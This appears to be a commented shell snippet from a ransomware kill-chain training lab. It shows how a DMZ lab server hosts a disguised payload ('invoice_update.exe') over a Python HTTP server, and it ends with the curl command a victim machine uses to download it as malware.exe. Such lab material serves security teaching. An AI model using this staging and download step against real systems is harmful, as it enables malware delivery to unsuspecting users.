# Description:
#  Commands used on the Ubuntu DMZ server (10.10.20.10)
#  to host a simulated malicious payload for the ransomware kill chain lab.

# 1. Navigate to the directory where the payload is stored
cd ~/dmz_payloads

# 2. List files in the directory (should include invoice_update.exe or similar)
ls -l

# Example output (for reference):
# -rw-r--r-- 1 ubuntu ubuntu   24576 Nov 28 15:32 invoice_update.exe

# 3. Start a Python HTTP server on port 8080
python3 -m http.server 8080

# The DMZ server is now accessible from the LAN as:
#   http://10.10.20.10:8080/invoice_update.exe

# This URL is used by the Windows victim to download the simulated payload:
#   curl http://10.10.20.10:8080/invoice_update.exe -O malware.exe
